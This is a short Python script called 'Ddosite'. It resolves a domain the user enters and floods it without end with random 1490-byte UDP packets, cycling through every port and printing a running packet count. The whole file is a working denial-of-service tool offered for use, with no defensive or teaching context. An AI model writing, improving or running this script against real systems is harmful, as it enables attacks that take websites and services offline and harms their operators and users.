import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
#Define colors
G='\033[92m'
W='\033[37m'
print(G+"#==========Ddosite==========#"+W)

site = str(input("Domain name: "))
ip = socket.gethostbyname(site)
port = int(input("Port: "))

time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print (G+"Sent %s packet to %s throught port:%s"%(sent,ip,port), end="\r"+W)
     if port == 65534:
       port = 1
